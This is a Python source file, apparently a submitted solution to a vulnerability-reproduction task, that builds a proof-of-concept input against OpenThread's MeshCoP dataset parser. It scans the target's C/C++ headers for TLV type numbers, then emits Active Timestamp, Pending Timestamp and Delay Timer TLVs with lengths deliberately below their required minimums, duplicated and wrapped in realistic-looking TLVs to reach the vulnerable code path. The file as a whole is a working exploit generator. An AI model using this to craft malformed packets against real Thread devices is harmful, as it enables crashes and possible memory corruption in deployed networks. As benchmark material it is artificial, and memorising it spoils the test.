import os
import re
from typing import Dict, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to extract exact TLV type numbers from source
        tlv_types = self._extract_tlv_types(src_path)

        # Fallback guesses if not found
        # Common MeshCoP TLV type IDs in OpenThread (best-effort guesses):
        # kActiveTimestamp: 14, kPendingTimestamp: 15, kDelayTimer: 16
        if tlv_types.get('ActiveTimestamp') is None:
            tlv_types['ActiveTimestamp'] = 14
        if tlv_types.get('PendingTimestamp') is None:
            tlv_types['PendingTimestamp'] = 15
        if tlv_types.get('DelayTimer') is None:
            tlv_types['DelayTimer'] = 16

        # Construct a dataset TLV sequence designed to exploit the bug:
        # - Include the problematic TLVs with lengths below their required minimums:
        #   Active/Pending Timestamp (< 8) and Delay Timer (< 4).
        # - Add some benign TLVs (if we discovered their IDs) to mimic a realistic dataset.
        # - Keep the PoC compact.
        tlvs = []

        def add_tlv(t: int, val: bytes):
            tlvs.append(bytes([t & 0xFF, len(val) & 0xFF]) + val)

        # Problematic TLVs with too-short lengths
        add_tlv(tlv_types['ActiveTimestamp'], b'\x00')   # should be >= 8
        add_tlv(tlv_types['PendingTimestamp'], b'\x01')  # should be >= 8
        add_tlv(tlv_types['DelayTimer'], b'\x02')        # should be >= 4

        # Try to add a couple of common/benign TLVs if we could find them, to make input more realistic
        # This may help the target proceed further in vulnerable versions.
        # We'll use minimal valid-like contents for these.
        for key, default_value in [
            ('Channel', b'\x00\x0b'),            # pretend 11
            ('PanId', b'\x34\x12'),              # 0x1234
            ('ExtendedPanId', b'\x01\x02\x03\x04\x05\x06\x07\x08'),
            ('NetworkName', b'T'),               # 1-char name
            ('SecurityPolicy', b'\x00\x00'),     # minimal placeholder
        ]:
            tnum = tlv_types.get(key)
            if tnum is not None:
                add_tlv(tnum, default_value)

        # Also add duplicates of problematic TLVs to increase likelihood of reaching a vulnerable code path
        add_tlv(tlv_types['ActiveTimestamp'], b'\xAA')
        add_tlv(tlv_types['PendingTimestamp'], b'\xBB')
        add_tlv(tlv_types['DelayTimer'], b'\xCC')

        # Compose final byte sequence
        data = b''.join(tlvs)

        # If for any reason we ended up too small, pad with a few benign unknown TLVs
        # Unknown TLVs should be skipped by parsers but keep structure consistent.
        if len(data) < 16:
            data += self._pad_unknown_tlvs(16 - len(data))

        return data

    def _pad_unknown_tlvs(self, need: int) -> bytes:
        out = bytearray()
        t = 250
        while len(out) < need:
            val = b'\x00'
            out += bytes([t & 0xFF, len(val)]) + val
            t = (t + 1) & 0xFF
        return bytes(out)

    def _extract_tlv_types(self, root: str) -> Dict[str, Optional[int]]:
        # Map friendly names to various possible enumerator tokens used in OpenThread
        targets = {
            'ActiveTimestamp': ['kActiveTimestamp', 'ActiveTimestamp', 'kActiveTimestampTlv'],
            'PendingTimestamp': ['kPendingTimestamp', 'PendingTimestamp', 'kPendingTimestampTlv'],
            'DelayTimer': ['kDelayTimer', 'DelayTimer', 'kDelayTimerTlv'],
            'Channel': ['kChannel', 'Channel', 'kChannelTlv'],
            'PanId': ['kPanId', 'PanId', 'kPanIdTlv'],
            'ExtendedPanId': ['kExtendedPanId', 'ExtendedPanId', 'kExtendedPanIdTlv'],
            'NetworkName': ['kNetworkName', 'NetworkName', 'kNetworkNameTlv'],
            'SecurityPolicy': ['kSecurityPolicy', 'SecurityPolicy', 'kSecurityPolicyTlv'],
        }
        results: Dict[str, Optional[int]] = {k: None for k in targets.keys()}

        # Collect candidate files
        candidate_files = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith(('.h', '.hpp', '.hh', '.c', '.cc', '.cpp')):
                    continue
                # Focus on MeshCoP / TLVs / dataset
                lower = fn.lower()
                if ('tlv' in lower or 'dataset' in lower or 'meshcop' in lower) or fn.endswith(('.h', '.hpp', '.cc', '.cpp')):
                    candidate_files.append(os.path.join(dirpath, fn))

        # Read all files into memory for scanning
        texts = []
        for path in candidate_files:
            try:
                with open(path, 'rb') as f:
                    content = f.read()
                try:
                    text = content.decode('utf-8', errors='ignore')
                except Exception:
                    continue
                texts.append(text)
            except Exception:
                continue

        # First pass: look for direct assignments like kActiveTimestamp = 14
        for text in texts:
            no_comments = self._strip_c_comments(text)
            for name, tokens in targets.items():
                if results[name] is not None:
                    continue
                for tok in tokens:
                    # Direct numeric assignment (decimal or hex)
                    m = re.search(r'(?:^|[,{\s])' + re.escape(tok) + r'\s*=\s*(0x[0-9A-Fa-f]+|\d+)', no_comments)
                    if m:
                        try:
                            results[name] = int(m.group(1), 0)
                        except Exception:
                            pass
                        if results[name] is not None:
                            break

        # Second pass: parse enums where values might be implicit
        unresolved = [k for k, v in results.items() if v is None]
        if unresolved:
            for text in texts:
                no_comments = self._strip_c_comments(text)
                for enum_body in self._find_enum_bodies(no_comments):
                    enum_map = self._parse_enum(enum_body)
                    if not enum_map:
                        continue
                    for name, tokens in targets.items():
                        if results[name] is not None:
                            continue
                        for tok in tokens:
                            if tok in enum_map:
                                results[name] = enum_map[tok]
                                break

        return results

    def _strip_c_comments(self, s: str) -> str:
        # Remove // and /* */ comments
        s = re.sub(r'//.*', '', s)
        s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
        return s

    def _find_enum_bodies(self, s: str):
        # Find occurrences of "enum ... { ... }"
        # Simple brace matching to avoid nested enums edge-cases
        # This is heuristic but should work for typical headers.
        enums = []
        for m in re.finditer(r'enum(?:\s+class)?\s+[A-Za-z_]\w*\s*\{', s):
            start = m.end()
            idx = start
            depth = 1
            while idx < len(s) and depth > 0:
                if s[idx] == '{':
                    depth += 1
                elif s[idx] == '}':
                    depth -= 1
                idx += 1
            if depth == 0:
                body = s[start:idx - 1]
                enums.append(body)
        return enums

    def _parse_enum(self, body: str) -> Dict[str, int]:
        # Parse enumerator list with possible explicit expressions.
        # Support simple expressions with |, +, <<, and references to prior enumerators.
        enum_map: Dict[str, int] = {}
        cur_val: Optional[int] = None

        # Split by commas not inside parentheses (rare in enums)
        parts = []
        start = 0
        depth = 0
        for i, ch in enumerate(body):
            if ch == '(':
                depth += 1
            elif ch == ')':
                depth = max(0, depth - 1)
            elif ch == ',' and depth == 0:
                parts.append(body[start:i])
                start = i + 1
        parts.append(body[start:])

        for part in parts:
            tok = part.strip()
            if not tok:
                continue
            # Remove trailing attributes like = value /* comment */ or with trailing assignments, etc.
            # Extract name and optional expression
            m = re.match(r'^([A-Za-z_]\w*)(?:\s*=\s*(.+))?$', tok)
            if not m:
                continue
            name, expr = m.group(1), m.group(2)
            if expr is None:
                if cur_val is None:
                    cur_val = 0
                else:
                    cur_val += 1
                enum_map[name] = cur_val
            else:
                val = self._eval_enum_expr(expr, enum_map)
                if val is None:
                    # Try to parse as plain int
                    try:
                        val = int(expr.strip(), 0)
                    except Exception:
                        val = None
                if val is None:
                    # Fallback: do not map this one
                    continue
                cur_val = int(val)
                enum_map[name] = cur_val
        return enum_map

    def _eval_enum_expr(self, expr: str, mapping: Dict[str, int]) -> Optional[int]:
        # Replace known identifiers with numeric values
        def repl_ident(m):
            name = m.group(0)
            if name in mapping:
                return str(mapping[name])
            return name

        cleaned = expr.strip()
        cleaned = re.sub(r'\b[A-Za-z_]\w*\b', repl_ident, cleaned)
        # Allow only safe characters/operators
        if not re.fullmatch(r"[0-9xXa-fA-F\s\|\&\^\+\-\*\(\)<>~]+", cleaned):
            return None
        try:
            return int(eval(cleaned, {"__builtins__": {}}, {}))
        except Exception:
            return None